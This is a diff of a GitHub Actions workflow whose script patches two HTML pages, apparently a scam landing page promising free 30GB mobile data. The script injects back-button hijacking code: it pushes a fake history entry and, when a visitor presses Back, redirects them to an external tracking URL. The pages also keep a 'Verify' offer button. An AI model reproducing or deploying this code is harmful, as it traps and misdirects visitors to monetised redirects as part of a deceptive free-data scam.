@@ -15,10 +15,10 @@ jobs:
       - uses: actions/checkout@v4
         with:
           fetch-depth: 0
-      - name: Replace auto redirect code with back-only behavior
-        shell: python
+
+      - name: Patch back navigation
         run: |
-          import re
+          python3 - <<'PY'
           from pathlib import Path
 
           files = [
@@ -26,13 +26,13 @@ jobs:
               Path('Samu Kyautar 30GB Data A Kowane Layi.html'),
           ]
 
-          back_url = 'https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b'
-          replacement = '''
-    <script>
+          start_marker = '    <script>\n        window.onhashchange = function() {'
+          end_marker = '        })(window);\n    </script>'
+          replacement = '''    <script>
         (function () {
             var backRedirectUrl = "https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b";
             if (window.history && window.history.pushState) {
-                window.history.pushState({ backRedirectGuard: true }, "", window.location.href);
+                window.history.pushState({}, "", window.location.href);
                 window.addEventListener("popstate", function () {
                     window.location.replace(backRedirectUrl);
                 }, { once: true });
@@ -40,32 +40,33 @@ jobs:
         })();
     </script>'''
 
-          pattern = re.compile(
-              r'\s*<script>\s*window\.onhashchange\s*=\s*function\(\)\s*\{.*?\}\)\(window\);\s*</script>',
-              re.S,
-          )
-
           for path in files:
               text = path.read_text(encoding='utf-8')
-              updated, count = pattern.subn(replacement, text, count=1)
-              if count != 1:
-                  raise SystemExit(f'{path}: expected one legacy back-navigation block, found {count}')
-              if 'noBackPlease' in updated:
-                  raise SystemExit(f'{path}: legacy noBackPlease code still present')
-              if 'global.onhashchange' in updated:
-                  raise SystemExit(f'{path}: legacy global hash handler still present')
+              start = text.find(start_marker)
+              if start == -1:
+                  raise SystemExit(f'{path}: legacy back block start not found')
+              end = text.find(end_marker, start)
+              if end == -1:
+                  raise SystemExit(f'{path}: legacy back block end not found')
+              end += len(end_marker)
+              updated = text[:start] + replacement + text[end:]
+
+              if 'noBackPlease' in updated or 'global.onhashchange' in updated:
+                  raise SystemExit(f'{path}: legacy hash code remains')
               if 'window.onhashchange = function()' in updated:
-                  raise SystemExit(f'{path}: legacy window hash handler still present')
+                  raise SystemExit(f'{path}: legacy hash redirect remains')
               if updated.count('window.location.replace(backRedirectUrl)') != 1:
-                  raise SystemExit(f'{path}: expected exactly one back-only redirect')
+                  raise SystemExit(f'{path}: back-only redirect check failed')
               if updated.count('id="offer2"') != 1:
-                  raise SystemExit(f'{path}: second Verify button changed unexpectedly')
+                  raise SystemExit(f'{path}: Verify button changed unexpectedly')
+
               path.write_text(updated, encoding='utf-8')
 
           if files[0].read_bytes() != files[1].read_bytes():
-              raise SystemExit('HTML entry files are no longer identical')
+              raise SystemExit('HTML files no longer match')
+          PY
 
-      - name: Commit fix and remove helper workflows
+      - name: Commit fix
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
